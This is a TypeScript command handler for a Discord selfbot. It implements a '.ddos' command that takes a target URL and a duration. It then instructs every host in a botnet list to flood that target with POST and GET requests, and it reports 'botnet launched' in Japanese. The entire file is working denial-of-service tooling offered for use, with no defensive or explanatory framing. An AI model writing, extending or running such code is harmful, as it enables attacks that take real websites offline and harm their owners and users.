import { Message } from "discord.js-selfbot-v13";
import * as fs from "fs";

const botnetList = fs.readFileSync("./data/botnet.list", "utf8").split("\n").map((url) => url.trim()).map((url) => {
    return url.split("\r")
}).flat();

export const ddos = async (message: Message) => {
  const args = message.content
    .replace(".ddos", "")
    .replace(/\s\s/g, " ")
    .split(" ");

  if (args.length < 3) {
    message.reply("引数が足らないで;;");
  } else {
    const _url = args[1];
    const _time = args[2];

    try {
      const url = new URL("https://" + _url.replace(/\r/g, "")).toString();
      const time = parseInt(_time);

      if (isNaN(time) || time <= 0 || time > 60) {
        message.reply("秒数がおかしいよ;;");
        return;
      }

      message.reply("Botnetの起動中・・・ (無料版)");

      for (let i = 0, len = botnetList.length; i < len; i++) {
        const botnetURL = "https://" + botnetList[i].replace(/\r/g, "");

        fetch(botnetURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            targetUrl: url,
            method: "POST",
            timeout: time * 1000,
          }),
        });

        fetch(botnetURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            targetUrl: url,
            method: "GET",
            timeout: time * 1000,
          }),
        });

        await new Promise((resolve) => setTimeout(resolve, 5));
      }

      message.reply("Botnetの起動完了");
    } catch (e) {
      message.reply("URLか秒数がおかしいです。");
      return;
    }
  }
};
